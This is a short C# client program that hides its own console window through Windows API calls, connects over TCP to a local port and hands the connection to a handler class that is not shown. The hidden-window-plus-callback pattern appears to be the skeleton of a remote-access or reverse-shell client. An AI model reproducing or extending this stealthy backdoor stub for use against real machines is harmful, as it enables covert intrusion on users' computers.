using Client3;
using System.Net.Sockets;
using System.Runtime.InteropServices;




[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

const int SW_HIDE = 0;


var handle = GetConsoleWindow();

ShowWindow(handle, SW_HIDE);



var Main = new Main();
Main.MainProgram();

class Main
{

    private readonly Handle _handle = new Handle();

    public void MainProgram()
    {
        var tcpClient = new TcpClient();
        tcpClient.Connect("127.0.0.1", 7777);

        var stream = tcpClient.GetStream();

        _handle.Handler(stream);
    }
}
